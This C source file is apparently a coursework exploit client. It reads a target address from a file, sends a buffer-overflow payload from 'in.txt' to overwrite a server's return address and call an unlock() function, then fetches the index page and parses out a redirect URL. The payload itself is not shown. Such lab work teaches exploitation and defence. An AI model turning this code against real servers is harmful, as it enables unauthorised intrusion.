/*
 * This program accepts a file that contains the ip address and port number 
 * of the targeted server. The program first smashes the server through 
 * buffer overflowing and overwriting the return address. Then the 
 * GET request is sent to retrieve the index page, which is parsed for 
 * the redirected URL.
 * 
 * Name: Tien Thuy Ho
 * Last edited: February 16, 2018
 */
#include "utils.h"

#define SMASHINPUT  "in.txt"

int					sockfd;
struct sockaddr_in	servaddr;
char                buff[MAXLINE], response[MAXLINE];

/* 
 * Connect to the server.
 */
void connectserver() {
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("socket error");
        exit(1);
    }

    if (connect(sockfd, (struct sockaddr *) &servaddr, sizeof(servaddr)) < 0) {
        perror("connect error");
        exit(0);
    }

    printf("Connected\n");
    fflush(stdout);
}

/* 
 * Smash the server through buffer overflowing.
 */
void smash() {
    connectserver();

    FILE *input = fopen(SMASHINPUT, "r");
    if (input) {
        bzero(buff, sizeof(buff));
        fgets(buff, MAXLINE, input);
    }

    if (write(sockfd, buff, strlen(buff)) < 0) {
        perror("write error");
        exit(0);
    }

    printf("Smashed the server to invoke the function unlock() at address 0x401379.\n");
    printf("%s\n", DIVIDER);
    fflush(stdout);
}

/* 
 * Extract the redirected URL from the smashed index page returned by the server.
 */
static void extracturl(char *response) {
    char url[MAXLINE];
    bzero(url, MAXLINE);

    char *found;
    if ((found = strstr(response, "URL")) != NULL) {
        // get to the beginning of the actual url
        while (*found++ != '\'');
        
        // the url is enclosed in ''
        int i = 0;
        while (*found != '\'') {
            url[i++] = *found++;
        }
    }

    printf("%s\n", url);
    fflush(stdout);
}

/* 
 * Send the server a GET request for the index page.
 */
void getindexpage() {
    connectserver();

    strcpy(buff, "GET / HTTP/1.0");
    if (write(sockfd, buff, strlen(buff)) < 0) {
        perror("write error");
        exit(0);
    }

    char indexpage[MAXLINE];
    bzero(indexpage, MAXLINE);
    int finished = FALSE;
    int recv;
    bzero(response, sizeof(response));
    while (!finished) {
        recv = read(sockfd, response, MAXLINE);
        if (recv < 0) {
            perror("read error");
            exit(0);
        } else if (recv == 0) {
            finished = TRUE;
        } else {
            strcat(indexpage, response);
            bzero(response, sizeof(response));
        }
    }

    printf("%s\n", indexpage);
    printf("%s\n", DIVIDER);
    fflush(stdout);
    extracturl(indexpage);
}

int main(int argc, char **argv) {
    char *usage = "Usage: smash <server file>";

    if (argc != 2) {
        printf("%s\n", usage);
        exit(-1);
    }

    // get the ipaddress and port number from the file
    FILE *inputfile = fopen(argv[1], "r");
    int port = 0;
    char ipaddress[MAXLINE];
    if (inputfile) {
        int recv = fscanf(inputfile, "%s %d", ipaddress, &port);
        fclose(inputfile);
        if (recv == 0) {
            printf("Cannot find server info.\n");
            exit(0);
        }
    }

    bzero(&servaddr, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(port);

    // intialize the server's ip address
    if (inet_pton(AF_INET, ipaddress, &servaddr.sin_addr) <= 0) {
        printf("inet_pton error for %s", argv[1]);
        exit(0);
    }

    smash();
    getindexpage();
}

